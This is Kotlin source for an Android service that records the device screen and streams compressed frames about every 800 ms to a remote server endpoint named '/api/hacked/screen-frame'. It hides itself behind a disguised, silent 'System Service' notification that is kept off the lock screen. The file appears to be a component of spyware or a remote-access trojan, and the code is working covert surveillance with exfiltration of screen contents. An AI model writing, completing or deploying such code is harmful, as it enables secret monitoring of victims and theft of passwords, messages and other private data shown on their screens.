package com.psknmrc.appimport android.app.*import android.content.Contextimport android.content.Intentimport android.graphics.Bitmapimport android.graphics.PixelFormatimport android.hardware.display.DisplayManagerimport android.hardware.display.VirtualDisplayimport android.media.Imageimport android.media.ImageReaderimport android.media.projection.MediaProjectionimport android.media.projection.MediaProjectionManagerimport android.os.*import android.util.Base64import android.util.DisplayMetricsimport android.view.WindowManagerimport androidx.core.app.NotificationCompatimport org.json.JSONObjectimport java.io.ByteArrayOutputStreamimport java.io.OutputStreamWriterimport java.net.HttpURLConnectionimport java.net.URLclass ScreenCaptureService : Service() {    private val CHANNEL_ID = "screen_capture_ch"    private val NOTIF_ID   = 303    private var mediaProjection: MediaProjection? = null    private var virtualDisplay: VirtualDisplay?   = null    private var imageReader: ImageReader?          = null    private val handler = Handler(Looper.getMainLooper())    private var captureRunnable: Runnable? = null    private var serverUrl  = ""    private var deviceId   = ""    private var deviceToken = ""    private var isRunning  = false    // Screen dimensions    private var screenW = 0    private var screenH = 0    private var screenDpi = 0    override fun onBind(intent: Intent?): IBinder? = null    override fun onCreate() {        super.onCreate()        createNotificationChannel()        startForeground(NOTIF_ID, buildNotification())    }    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {        val action = intent?.getStringExtra("action") ?: return START_NOT_STICKY        serverUrl   = intent.getStringExtra("serverUrl")   ?: ""        deviceId    = intent.getStringExtra("deviceId")    ?: ""        deviceToken = intent.getStringExtra("deviceToken") ?: ""        when (action) {            "start" -> {                val resultCode   = intent.getIntExtra("resultCode", 0)                val resultData   = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)                    intent.getParcelableExtra("resultData", Intent::class.java)                else                    @Suppress("DEPRECATION") intent.getParcelableExtra("resultData")                if (resultData == null || resultCode == 0) {                    stopSelf(); return START_NOT_STICKY                }                startCapture(resultCode, resultData)            }            "stop" -> stopCapture()        }        return START_NOT_STICKY    }    private fun startCapture(resultCode: Int, resultData: Intent) {        val metrics = DisplayMetrics()        val wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {            val bounds = wm.currentWindowMetrics.bounds            screenW   = bounds.width()            screenH   = bounds.height()            screenDpi = resources.displayMetrics.densityDpi        } else {            @Suppress("DEPRECATION")            wm.defaultDisplay.getMetrics(metrics)            screenW   = metrics.widthPixels            screenH   = metrics.heightPixels            screenDpi = metrics.densityDpi        }        // Scale down biar lebih ringan di jaringan        val scale  = 0.5f        val capW   = (screenW * scale).toInt()        val capH   = (screenH * scale).toInt()        val pm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager        mediaProjection = pm.getMediaProjection(resultCode, resultData)        imageReader = ImageReader.newInstance(capW, capH, PixelFormat.RGBA_8888, 2)        virtualDisplay = mediaProjection?.createVirtualDisplay(            "ScreenLive",            capW, capH, screenDpi,            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,            imageReader?.surface, null, null        )        isRunning = true        startSendingFrames()    }    private fun startSendingFrames() {        captureRunnable = object : Runnable {            override fun run() {                if (!isRunning) return                captureAndSend()                handler.postDelayed(this, 800) // ~1.25 fps ˇŞ hemat baterai            }        }        handler.postDelayed(captureRunnable!!, 500)    }    private fun captureAndSend() {        val reader = imageReader ?: return        var image: Image? = null        try {            image = reader.acquireLatestImage() ?: return            val planes = image.planes            val buffer = planes[0].buffer            val pixelStride  = planes[0].pixelStride            val rowStride    = planes[0].rowStride            val rowPadding   = rowStride - pixelStride * image.width            val bmp = Bitmap.createBitmap(                image.width + rowPadding / pixelStride,                image.height, Bitmap.Config.ARGB_8888            )            bmp.copyPixelsFromBuffer(buffer)            // Crop kalau ada padding            val cropped = Bitmap.createBitmap(bmp, 0, 0, image.width, image.height)            bmp.recycle()            val baos = ByteArrayOutputStream()            cropped.compress(Bitmap.CompressFormat.JPEG, 55, baos)            cropped.recycle()            val b64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP)            sendFrameToServer(b64, image.width, image.height)        } catch (_: Exception) {        } finally {            image?.close()        }    }    private fun sendFrameToServer(b64: String, w: Int, h: Int) {        Thread {            try {                val body = JSONObject().apply {                    put("deviceId",    deviceId)                    put("frameBase64", b64)                    put("width",       w)                    put("height",      h)                }.toString()                val url  = URL("$serverUrl/api/hacked/screen-frame")                val conn = url.openConnection() as HttpURLConnection                conn.requestMethod = "POST"                conn.setRequestProperty("Content-Type", "application/json")                conn.setRequestProperty("x-device-token", deviceToken)                conn.doOutput = true                conn.connectTimeout = 5000                conn.readTimeout    = 5000                OutputStreamWriter(conn.outputStream).also { it.write(body); it.flush() }                conn.responseCode                conn.disconnect()            } catch (_: Exception) {}        }.start()    }    private fun stopCapture() {        isRunning = false        captureRunnable?.let { handler.removeCallbacks(it) }        virtualDisplay?.release()        imageReader?.close()        mediaProjection?.stop()        virtualDisplay    = null        imageReader       = null        mediaProjection   = null        stopSelf()    }    private fun buildNotification(): Notification =        NotificationCompat.Builder(this, CHANNEL_ID)            .setContentTitle("System Service")            .setContentText("")            .setSmallIcon(android.R.drawable.ic_menu_view)            .setPriority(NotificationCompat.PRIORITY_MIN)            .setSilent(true)            .setVisibility(NotificationCompat.VISIBILITY_SECRET)            .build()    private fun createNotificationChannel() {        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {            val ch = NotificationChannel(CHANNEL_ID, "System",                NotificationManager.IMPORTANCE_NONE).apply {                setShowBadge(false)                lockscreenVisibility = Notification.VISIBILITY_SECRET            }            (getSystemService(NotificationManager::class.java)).createNotificationChannel(ch)        }    }    override fun onDestroy() {        super.onDestroy()        stopCapture()    }}